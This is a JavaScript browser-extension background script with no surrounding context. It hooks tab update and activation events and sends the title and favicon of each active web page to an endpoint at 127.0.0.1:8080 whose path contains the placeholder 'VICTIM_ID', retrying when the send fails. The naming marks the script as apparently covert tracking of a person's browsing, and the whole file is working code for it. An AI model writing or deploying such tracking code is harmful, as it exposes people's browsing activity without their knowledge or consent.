function getFavicon(tab) {
  return tab.favIconUrl || "";
}

const pendingUpdates = new Map();
const lastSiteInfo = new Map();

function sendSiteInfo(title, favicon) {
  return fetch("http://127.0.0.1:8080/VICTIM_ID/site-info", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      title: title,
      favicon: favicon
    })
  }).then(response => {
    if (!response.ok) {
      throw new Error(`site-info returned ${response.status}`);
    }
    console.log("Site info sent successfully for tab:", title);
  });
}

async function publishTabSiteInfo(tab) {
  if (
    !tab ||
    !tab.active ||
    !tab.url ||
    !/^https?:\/\//i.test(tab.url)
  ) {
    return;
  }

  const title = tab.title || "";
  const favicon = getFavicon(tab);
  const signature = `${title}\n${favicon}`;
  if (lastSiteInfo.get(tab.id) === signature) return;

  try {
    await sendSiteInfo(title, favicon);
    lastSiteInfo.set(tab.id, signature);
  } catch (err) {
    console.error("Failed to send site info:", err);
    scheduleSiteInfo(tab.id, 1000);
  }
}

function scheduleSiteInfo(tabId, delay = 200) {
  clearTimeout(pendingUpdates.get(tabId));
  pendingUpdates.set(tabId, setTimeout(() => {
    pendingUpdates.delete(tabId);
    browser.tabs.get(tabId)
      .then(publishTabSiteInfo)
      .catch(err => console.error("Error getting tab site info:", err));
  }, delay));
}

browser.tabs.onUpdated.addListener((tabId, changeInfo) => {
  if (
    changeInfo.status === "complete" ||
    Object.prototype.hasOwnProperty.call(changeInfo, "favIconUrl") ||
    Object.prototype.hasOwnProperty.call(changeInfo, "title")
  ) {
    scheduleSiteInfo(tabId);
  }
});

browser.tabs.onActivated.addListener(({ tabId }) => {
  scheduleSiteInfo(tabId);
});

browser.tabs.onRemoved.addListener(tabId => {
  clearTimeout(pendingUpdates.get(tabId));
  pendingUpdates.delete(tabId);
  lastSiteInfo.delete(tabId);
});
